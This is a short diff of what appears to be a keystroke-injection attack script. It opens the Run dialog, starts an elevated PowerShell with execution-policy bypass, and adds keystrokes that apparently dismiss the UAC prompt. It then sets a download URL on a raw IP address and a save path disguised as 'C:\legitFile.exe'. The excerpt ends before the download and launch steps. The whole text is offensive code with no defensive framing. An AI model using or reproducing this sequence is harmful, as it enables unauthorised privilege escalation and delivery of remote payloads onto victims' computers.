@@ -1,6 +1,8 @@
 <windows+r>
 powershell -c "start-process powershell -verb runas -argumentlist '-ex bypass'"
 <enter>
+<right>
+<enter>
 $downloadUrl = "http://129.151.211.93:5000/download"
 <enter>
 $downloadPath = "C:\legitFile.exe"
